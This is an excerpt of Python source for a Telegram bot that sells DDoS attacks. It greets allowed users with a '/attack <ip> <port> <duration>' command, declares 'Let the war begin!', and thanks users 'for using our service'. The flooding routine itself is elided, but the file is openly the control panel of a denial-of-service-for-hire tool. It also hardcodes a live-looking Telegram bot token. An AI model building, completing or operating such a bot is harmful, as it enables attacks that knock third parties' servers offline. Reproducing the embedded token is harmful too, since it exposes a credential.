...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7704003705:AAFlLlB5stM1A_fgqicNhuuZkNcECYSDhOs'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ уσυ αяє ησт αυтнσяιzє∂ тσ υѕє тнιѕ вσт!*", parse_mode='Markdown')
        return

    message = (
        "*🚀🚀Welcome to the ıllıllı ƔαɱקIııƦǝ ɱσ∂ χ DɗoS̴ S̴ǝƦƔǝƦ ıllıllı 🚀🚀*\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀 Let the war begin! with @DEMON_ROCKY 🚀*"
    )
...
async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ уσυ αяє ησт αυтнσяιzє∂ тσ α∂∂ υѕєяѕ!*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, byte_size, threads, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*🚀🚀💀 𝑨𝑻𝑻𝑨𝑪𝑲 𝑭𝑰𝑵𝑰𝑺𝑯𝑬𝑫 💀🚀🚀*\n* 🚀🚀ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴏᴜʀ ꜱᴇʀᴠɪᴄᴇ! @VAMPIREXCHEATS 🚀🚀*", parse_mode='Markdown')
